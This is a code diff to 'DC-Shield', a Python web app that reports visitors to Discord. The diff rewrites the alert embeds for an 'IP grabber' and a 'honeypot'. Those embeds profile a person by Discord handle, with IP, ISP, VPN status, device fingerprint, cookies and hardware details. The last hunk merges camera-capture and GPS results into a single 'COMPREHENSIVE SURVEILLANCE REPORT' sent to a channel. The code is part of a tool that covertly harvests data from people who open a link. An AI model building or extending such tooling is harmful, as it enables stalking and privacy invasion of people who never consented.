@@ -15,6 +15,7 @@ from datetime import datetime
 from user_agents import parse
 from logger import Logger
 from json_handler import *
+from surveillance_embeds import create_combined_surveillance_embed, create_interactive_buttons
 from quart import Quart, jsonify, redirect, render_template, request, send_file
 
 app = Quart(__name__)
@@ -227,158 +228,245 @@ def send_to_channel(message:str, embed_data=None, components=None):
 
 def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
     """
-    Create a rich Discord embed for honeypot triggers.
+    Create an enhanced Discord embed for honeypot triggers with improved visuals
     """
+    from surveillance_embeds import get_threat_indicator, create_progress_bar
+
+    # Calculate threat score based on honeypot trigger
+    threat_score = 75  # Honeypot triggers are high risk
+    threat_level, embed_color = get_threat_indicator(threat_score)
+
     embed = {
-        "title": "🚨 HONEYPOT TRIGGERED 🚨",
-        "description": f"Suspicious user detected from **{country_code}**",
-        "color": 0xff4757,  # Red color
+        "title": "🚨 HONEYPOT SECURITY BREACH",
+        "description": f"**{threat_level} THREAT DETECTED**\n🎯 **Malicious actor intercepted from {country_code}**",
+        "color": embed_color,
         "timestamp": datetime.now().isoformat(),
         "thumbnail": {
-            "url": "https://cdn.discordapp.com/emojis/454652220064006147.gif"  # You can add a warning icon URL
+            "url": "https://cdn.discordapp.com/emojis/454652220064006147.gif"
         },
-        "fields": [
-            {
-                "name": "🌐 Network Information",
-                "value": f"**IP Address:** `{ip}`\n**Country:** {country_code}\n**More Info:** [Click here](https://iplocation.com/?ip={ip})",
-                "inline": False
-            },
-            {
-                "name": "🔗 Honeypot Destination",
-                "value": f"`{honeypot}`",
-                "inline": False
-            }
-        ],
+        "fields": [],
         "footer": {
-            "text": "DC-Shield Security System • Click button for full details",
+            "text": f"DC-Shield Honeypot Defense System • Threat Level: {threat_score}/100",
             "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png"
         }
     }
 
+    # Enhanced Network Intelligence
+    network_value = f"**IP Address:** `{ip}`\n"
+    network_value += f"**Country Code:** {country_code}\n"
+    network_value += f"**Threat Assessment:** {threat_level}\n"
+    network_value += f"**Risk Score:** {create_progress_bar(threat_score)}"
+
+    embed["fields"].append({
+        "name": "🌐 NETWORK INTELLIGENCE",
+        "value": network_value,
+        "inline": False
+    })
+
+    # Honeypot Information
+    honeypot_value = f"**Decoy Server:** `{honeypot}`\n"
+    honeypot_value += f"**Redirect Status:** ✅ Successfully executed\n"
+    honeypot_value += f"**Analysis:** [View IP Details](https://iplocation.com/?ip={ip})"
+
+    embed["fields"].append({
+        "name": "🍯 HONEYPOT DETAILS",
+        "value": honeypot_value,
+        "inline": False
+    })
+
     if device_info:
-        # Add device information fields (summarized)
+        # Enhanced Device Profile
         device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
-        device_value += f"**OS:** {device_info['os_family']} {device_info['os_version']}\n"
-        device_value += f"**Device:** {device_info['device_family']}"
+        device_value += f"**Operating System:** {device_info['os_family']} {device_info['os_version']}\n"
+        device_value += f"**Device Type:** {device_info['device_family']}"
+
         if device_info['device_brand'] and device_info['device_brand'] != 'None':
             device_value += f" ({device_info['device_brand']} {device_info['device_model']})"
 
-        device_type = "📱 Mobile" if device_info['is_mobile'] else "💻 Desktop" if device_info['is_pc'] else "📟 Tablet" if device_info['is_tablet'] else "🤖 Bot" if device_info['is_bot'] else "❓ Unknown"
-        device_value += f"\n**Type:** {device_type}"
+        device_type_emoji = "📱" if device_info['is_mobile'] else "💻" if device_info['is_pc'] else "📟" if device_info['is_tablet'] else "🤖" if device_info['is_bot'] else "❓"
+        device_type_text = "Mobile" if device_info['is_mobile'] else "Desktop" if device_info['is_pc'] else "Tablet" if device_info['is_tablet'] else "Bot" if device_info['is_bot'] else "Unknown"
+        device_value += f"\n**Platform:** {device_type_emoji} {device_type_text}"
 
         embed["fields"].append({
-            "name": "📱 Device Information",
+            "name": "📱 DEVICE FINGERPRINT",
             "value": device_value,
             "inline": True
         })
 
-        # Network details (summarized)
-        network_value = f"**Language:** {device_info['accept_language'][:30]}...\n"
-        network_value += f"**Referer:** {device_info['referer'][:50]}...\n"
-        network_value += f"**Time:** {device_info['access_time']}"
+        # Connection Intelligence
+        connection_value = f"**Language Settings:** {device_info['accept_language'][:25]}...\n"
+        connection_value += f"**Referrer Source:** {device_info['referer'][:40]}...\n"
+        connection_value += f"**Access Time:** {device_info['access_time']}\n"
+        connection_value += f"**User Agent:** {device_info['user_agent_string'][:50]}..."
 
         embed["fields"].append({
-            "name": "🌍 Connection Details",
-            "value": network_value,
+            "name": "🌍 CONNECTION ANALYSIS",
+            "value": connection_value,
             "inline": True
+        })
+
+        # Security Indicators
+        security_indicators = []
+        if device_info['has_session_cookies']:
+            security_indicators.append("⚠️ Session cookies present")
+        if device_info['has_tracking_cookies']:
+            security_indicators.append("⚠️ Tracking cookies detected")
+        if device_info['is_bot']:
+            security_indicators.append("🤖 Bot-like behavior")
+        if not security_indicators:
+            security_indicators.append("✅ No obvious red flags")
+
+        embed["fields"].append({
+            "name": "🔍 SECURITY INDICATORS",
+            "value": "\n".join(security_indicators),
+            "inline": False
         })
 
     return embed
 
 def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info):
     """
-    Create a rich Discord embed for IP grabber triggers.
+    Create an enhanced Discord embed for IP grabber triggers with comprehensive analysis
     """
+    from surveillance_embeds import get_threat_indicator, create_progress_bar, format_bytes
+
+    # Calculate threat score based on various factors
+    threat_score = 45  # Base score for IP grabbing
+    if vpn:
+        threat_score += 20  # VPN usage increases suspicion
+    if device_info.get('has_tracking_cookies'):
+        threat_score += 10
+    if device_info.get('is_bot'):
+        threat_score += 15
+
+    threat_score = min(threat_score, 100)
+    threat_level, embed_color = get_threat_indicator(threat_score)
+
     embed = {
-        "title": "🎯 IP GRABBER ACTIVATED",
-        "description": f"Target information successfully captured",
-        "color": 0x3742fa,  # Blue color
+        "title": "🎯 ADVANCED IP INTELLIGENCE CAPTURE",
+        "description": f"**{threat_level} TARGET ANALYSIS**\n📊 **Complete digital profile acquired for: `{dc_handle}`**",
+        "color": embed_color,
         "timestamp": datetime.now().isoformat(),
         "thumbnail": {
-            "url": "https://cdn.discordapp.com/emojis/target.png"  # You can add a target icon URL
+            "url": "https://cdn.discordapp.com/emojis/target.png"
         },
-        "fields": [
-            {
-                "name": "👤 Target Identification",
-                "value": f"**Username:** `{dc_handle}`\n**VPN Status:** {'🔒 Detected' if vpn else '❌ None'}",
-                "inline": True
-            },
-            {
-                "name": "🌐 Location Data",
-                "value": f"**IP:** `{ip_address}`\n**Country:** {country_name} ({country_code2})\n**ISP:** {isp}",
-                "inline": True
-            }
-        ],
+        "fields": [],
         "footer": {
-            "text": "DC-Shield IP Intelligence • Click button for full details",
+            "text": f"DC-Shield IP Intelligence System • Threat Score: {threat_score}/100",
             "icon_url": "https://cdn.discordapp.com/emojis/globe.png"
         }
     }
 
-    # Device information (summarized)
-    device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
-    device_value += f"**OS:** {device_info['os_family']} {device_info['os_version']}\n"
-    device_value += f"**Device:** {device_info['device_family']}"
-    if device_info['device_brand'] and device_info['device_brand'] != 'None':
-        device_value += f" ({device_info['device_brand']} {device_info['device_model']})"
-
-    device_type = "📱 Mobile" if device_info['is_mobile'] else "💻 Desktop" if device_info['is_pc'] else "📟 Tablet" if device_info['is_tablet'] else "🤖 Bot" if device_info['is_bot'] else "❓ Unknown"
-    device_value += f"\n**Type:** {device_type}"
+    # Enhanced Target Profile
+    target_value = f"**Discord Handle:** `{dc_handle}`\n"
+    target_value += f"**VPN Detection:** {'🔒 Active VPN detected' if vpn else '❌ No VPN protection'}\n"
+    target_value += f"**Risk Assessment:** {threat_level}\n"
+    target_value += f"**Threat Score:** {create_progress_bar(threat_score)}"
 
     embed["fields"].append({
-        "name": "📱 Device Fingerprint",
-        "value": device_value,
+        "name": "👤 TARGET PROFILE",
+        "value": target_value,
         "inline": False
     })
 
-    # Cookie and tracking information (summarized)
-    if device_info['cookie_count'] > 0:
-        cookie_value = f"**Total Cookies:** {device_info['cookie_count']}\n"
-        cookie_value += f"**Session Cookies:** {'⚠️ Yes' if device_info['has_session_cookies'] else '✅ No'}\n"
-        cookie_value += f"**Tracking Cookies:** {'⚠️ Yes' if device_info['has_tracking_cookies'] else '✅ No'}"
-
-        embed["fields"].append({
-            "name": "🍪 Cookie Analysis",
-            "value": cookie_value,
-            "inline": True
-        })
-
-    # Hardware information (summarized)
-    if device_info['sec_ch_device_memory'] != 'Unknown' or device_info['sec_ch_dpr'] != 'Unknown':
-        hardware_value = ""
-        if device_info['sec_ch_device_memory'] != 'Unknown':
-            hardware_value += f"**Memory:** {device_info['sec_ch_device_memory']} GB\n"
-        if device_info['sec_ch_dpr'] != 'Unknown':
-            hardware_value += f"**Screen DPR:** {device_info['sec_ch_dpr']}\n"
-        if device_info['sec_ch_ua_arch'] != 'Unknown':
-            hardware_value += f"**Architecture:** {device_info['sec_ch_ua_arch']}"
-
-        if hardware_value:
-            embed["fields"].append({
-                "name": "⚙️ Hardware Specs",
-                "value": hardware_value,
-                "inline": True
-            })
-
-    # Network performance (summarized)
-    network_perf = ""
-    if device_info['sec_ch_downlink'] != 'Unknown':
-        network_perf += f"**Speed:** {device_info['sec_ch_downlink']} Mbps\n"
-    if device_info['sec_ch_rtt'] != 'Unknown':
-        network_perf += f"**Latency:** {device_info['sec_ch_rtt']}ms\n"
-    network_perf += f"**Language:** {device_info['accept_language'][:20]}..."
+    # Geographic Intelligence
+    geo_value = f"**IP Address:** `{ip_address}`\n"
+    geo_value += f"**Country:** {country_name} ({country_code2})\n"
+    geo_value += f"**ISP Provider:** {isp}\n"
+    geo_value += f"**Analysis Link:** [Detailed Lookup](https://iplocation.com/?ip={ip_address})"
 
     embed["fields"].append({
-        "name": "🌍 Network Performance",
-        "value": network_perf,
+        "name": "🌍 GEOGRAPHIC INTELLIGENCE",
+        "value": geo_value,
         "inline": True
     })
 
-    # Add link to more info
+    # Enhanced Device Analysis
+    device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
+    device_value += f"**Operating System:** {device_info['os_family']} {device_info['os_version']}\n"
+    device_value += f"**Hardware:** {device_info['device_family']}"
+
+    if device_info['device_brand'] and device_info['device_brand'] != 'None':
+        device_value += f" ({device_info['device_brand']} {device_info['device_model']})"
+
+    platform_icons = {
+        'mobile': '📱', 'tablet': '📟', 'pc': '💻', 'bot': '🤖'
+    }
+    platform_type = 'mobile' if device_info['is_mobile'] else 'tablet' if device_info['is_tablet'] else 'pc' if device_info['is_pc'] else 'bot' if device_info['is_bot'] else 'unknown'
+    platform_emoji = platform_icons.get(platform_type, '❓')
+    device_value += f"\n**Platform:** {platform_emoji} {platform_type.title()}"
+
     embed["fields"].append({
-        "name": "🔗 Additional Information",
-        "value": f"[View detailed IP analysis](https://iplocation.com/?ip={ip_address})",
+        "name": "📱 DEVICE ANALYSIS",
+        "value": device_value,
+        "inline": True
+    })
+
+    # Privacy & Security Analysis
+    privacy_concerns = []
+    privacy_score = 0
+
+    if device_info['cookie_count'] > 0:
+        privacy_concerns.append(f"🍪 **Cookies:** {device_info['cookie_count']} detected")
+        privacy_score += min(device_info['cookie_count'] * 2, 20)
+
+    if device_info['has_session_cookies']:
+        privacy_concerns.append("⚠️ **Session Data:** Active sessions found")
+        privacy_score += 15
+
+    if device_info['has_tracking_cookies']:
+        privacy_concerns.append("⚠️ **Tracking:** Analytics cookies present")
+        privacy_score += 10
+
+    if device_info.get('dnt') == '1':
+        privacy_concerns.append("✅ **Do Not Track:** Enabled")
+    else:
+        privacy_concerns.append("❌ **Do Not Track:** Disabled")
+        privacy_score += 5
+
+    privacy_level = "🔴 High Risk" if privacy_score >= 30 else "🟡 Moderate Risk" if privacy_score >= 15 else "🟢 Low Risk"
+
+    embed["fields"].append({
+        "name": f"🔒 PRIVACY ANALYSIS ({privacy_level})",
+        "value": "\n".join(privacy_concerns),
         "inline": False
+    })
+
+    # Technical Specifications
+    tech_specs = []
+
+    if device_info.get('sec_ch_device_memory', 'Unknown') != 'Unknown':
+        tech_specs.append(f"**RAM:** {device_info['sec_ch_device_memory']} GB")
+
+    if device_info.get('sec_ch_ua_arch', 'Unknown') != 'Unknown':
+        tech_specs.append(f"**Architecture:** {device_info['sec_ch_ua_arch']}")
+
+    if device_info.get('sec_ch_dpr', 'Unknown') != 'Unknown':
+        tech_specs.append(f"**Display DPR:** {device_info['sec_ch_dpr']}")
+
+    if device_info.get('sec_ch_downlink', 'Unknown') != 'Unknown':
+        tech_specs.append(f"**Network Speed:** {device_info['sec_ch_downlink']} Mbps")
+
+    if device_info.get('sec_ch_rtt', 'Unknown') != 'Unknown':
+        tech_specs.append(f"**Network Latency:** {device_info['sec_ch_rtt']}ms")
+
+    if tech_specs:
+        embed["fields"].append({
+            "name": "⚙️ TECHNICAL SPECIFICATIONS",
+            "value": "\n".join(tech_specs),
+            "inline": True
+        })
+
+    # Connection Metadata
+    metadata_value = f"**Accept-Language:** {device_info['accept_language'][:30]}...\n"
+    metadata_value += f"**Connection Type:** {device_info['connection']}\n"
+    metadata_value += f"**Request Method:** {device_info['method']}\n"
+    metadata_value += f"**Content Type:** {device_info['content_type']}"
+
+    embed["fields"].append({
+        "name": "📊 CONNECTION METADATA",
+        "value": metadata_value,
+        "inline": True
     })
 
     return embed
@@ -581,24 +669,16 @@ async def collect_advanced_data():
 
 async def send_advanced_data_to_discord(collected_data):
     """
-    Send advanced collected data to Discord with detailed analysis
+    Send combined advanced collected data to Discord with interactive buttons
     """
     try:
         data = collected_data.get('data', {})
 
-        # Create comprehensive advanced data embed
-        embed = create_advanced_data_embed(data)
-        send_to_channel("🚨 **ADVANCED DATA INTERCEPTED** 🚨", embed)
+        # Create comprehensive combined embed with all data
+        embed = create_combined_surveillance_embed(data)
+        components = create_interactive_buttons(data)
 
-        # If camera was captured, send a separate embed with image
-        if data.get('camera', {}).get('captured'):
-            camera_embed = create_camera_embed(data['camera'])
-            send_to_channel("📸 **CAMERA ACCESS SUCCESSFUL** 📸", camera_embed)
-
-        # If GPS was captured, send location embed
-        if data.get('geolocation', {}).get('latitude'):
-            location_embed = create_location_embed(data['geolocation'])
-            send_to_channel("🌍 **GPS LOCATION ACQUIRED** 🌍", location_embed)
+        send_to_channel("🚨 **COMPREHENSIVE SURVEILLANCE REPORT** 🚨", embed, components)
 
     except Exception as e:
         l.error(f'Error sending advanced data to Discord: {e}')
